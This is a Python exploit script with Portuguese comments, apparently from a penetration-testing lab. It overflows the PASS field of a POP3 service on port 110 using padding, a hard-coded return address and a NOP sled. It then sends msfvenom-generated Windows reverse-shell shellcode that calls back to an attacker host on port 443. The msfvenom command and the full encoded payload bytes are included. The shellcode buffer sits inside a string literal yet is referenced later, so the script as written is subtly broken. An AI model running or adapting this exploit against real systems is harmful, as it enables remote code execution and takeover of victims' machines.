# RODAR NO LINUX

import socket

porta = 110
ip = '192.168.15.58'

# mudaremos os bytes e colocaremos nosso shell code
# bytes = "A" * 2607 + '\x8f\x35\x4a\x5f' + "C" * 390
# bytes = "A" * 2606 + '\x8f\x35\x4a\x5f' + "C" * 390

# shell code comando: 
# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.15.46 LPORT=443 -b "\x00\x0a\x0d\x20" -f python 

# o payload gera com b na frente de (bytes), necessario ajustar as outras strings tambem

'''
buf =  b""
buf += b"\xbf\xc1\xea\xaf\x42\xd9\xee\xd9\x74\x24\xf4\x5b\x29"
buf += b"\xc9\xb1\x52\x31\x7b\x12\x83\xeb\xfc\x03\xba\xe4\x4d"
buf += b"\xb7\xc0\x11\x13\x38\x38\xe2\x74\xb0\xdd\xd3\xb4\xa6"
buf += b"\x96\x44\x05\xac\xfa\x68\xee\xe0\xee\xfb\x82\x2c\x01"
buf += b"\x4b\x28\x0b\x2c\x4c\x01\x6f\x2f\xce\x58\xbc\x8f\xef"
buf += b"\x92\xb1\xce\x28\xce\x38\x82\xe1\x84\xef\x32\x85\xd1"
buf += b"\x33\xb9\xd5\xf4\x33\x5e\xad\xf7\x12\xf1\xa5\xa1\xb4"
buf += b"\xf0\x6a\xda\xfc\xea\x6f\xe7\xb7\x81\x44\x93\x49\x43"
buf += b"\x95\x5c\xe5\xaa\x19\xaf\xf7\xeb\x9e\x50\x82\x05\xdd"
buf += b"\xed\x95\xd2\x9f\x29\x13\xc0\x38\xb9\x83\x2c\xb8\x6e"
buf += b"\x55\xa7\xb6\xdb\x11\xef\xda\xda\xf6\x84\xe7\x57\xf9"
buf += b"\x4a\x6e\x23\xde\x4e\x2a\xf7\x7f\xd7\x96\x56\x7f\x07"
buf += b"\x79\x06\x25\x4c\x94\x53\x54\x0f\xf1\x90\x55\xaf\x01"
buf += b"\xbf\xee\xdc\x33\x60\x45\x4a\x78\xe9\x43\x8d\x7f\xc0"
buf += b"\x34\x01\x7e\xeb\x44\x08\x45\xbf\x14\x22\x6c\xc0\xfe"
buf += b"\xb2\x91\x15\x50\xe2\x3d\xc6\x11\x52\xfe\xb6\xf9\xb8"
buf += b"\xf1\xe9\x1a\xc3\xdb\x81\xb1\x3e\x8c\x6d\xed\x4f\x62"
buf += b"\x06\xec\x4f\x7b\x6d\x79\xa9\x11\x81\x2c\x62\x8e\x38"
buf += b"\x75\xf8\x2f\xc4\xa3\x85\x70\x4e\x40\x7a\x3e\xa7\x2d"
buf += b"\x68\xd7\x47\x78\xd2\x7e\x57\x56\x7a\x1c\xca\x3d\x7a"
buf += b"\x6b\xf7\xe9\x2d\x3c\xc9\xe3\xbb\xd0\x70\x5a\xd9\x28"
buf += b"\xe4\xa5\x59\xf7\xd5\x28\x60\x7a\x61\x0f\x72\x42\x6a"
buf += b"\x0b\x26\x1a\x3d\xc5\x90\xdc\x97\xa7\x4a\xb7\x44\x6e"
buf += b"\x1a\x4e\xa7\xb1\x5c\x4f\xe2\x47\x80\xfe\x5b\x1e\xbf"
buf += b"\xcf\x0b\x96\xb8\x2d\xac\x59\x13\xf6\xcc\xbb\xb1\x03"
buf += b"\x65\x62\x50\xae\xe8\x95\x8f\xed\x14\x16\x25\x8e\xe2"
buf += b"\x06\x4c\x8b\xaf\x80\xbd\xe1\xa0\x64\xc1\x56\xc0\xac"
'''

# incluir breakpoint no immunity:
# bp 5f4a358f

# incluido b na frente para transformar em bytes
bytes = b"A" * 2607 + b'\x8f\x35\x4a\x5f'
# bytes = b"A" * 2606 + b'\x8f\x35\x4a\x5f'
# nosso payload possui 351 bytes, devemos usar isso para incluir nossos NOPs
# para evitar que o shell code trunc
# x86/shikata_ga_nai succeeded with size 351 (iteration=0)

# NOP => \x90 - e deve ser mandado no formato de bytes
# e devemos colocar os 390 bytes (tamanho total) - 351 bytes (tamanho do shell code)
# bytes = "A" * 2606 + '\x8f\x35\x4a\x5f' + '\x90' * (390-351)
nop = b'\x90' * ( 390 - 350 )


# o envio deve ficar >>>> "A" * 2606 + '\x8f\x35\x4a\x5f' + '\x90' * (390-351) + buf

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, porta))
    r = s.recv(1024).decode()
    print(r)

    user = 'USER teste\r\n'
    s.send(user.encode('utf-8'))
    
    
    # incluir breakpoint no immunity:
    # bp 5f4a358f
    
    # envio dos bytes
    # password = 'PASS'+ bytes + '\r\n'
    # retirado o enter '\r\n'
    password = 'PASS'
    s.send(password.encode())
    s.send(bytes)
    s.send(nop)
    # enviar o payload (shell code)
    s.send(buf)
    s.send('\r\n'.encode())

    sair = 'QUIT\r\n'
    s.send(sair.encode('utf-8'))
    
except:
    print("falha de conexao")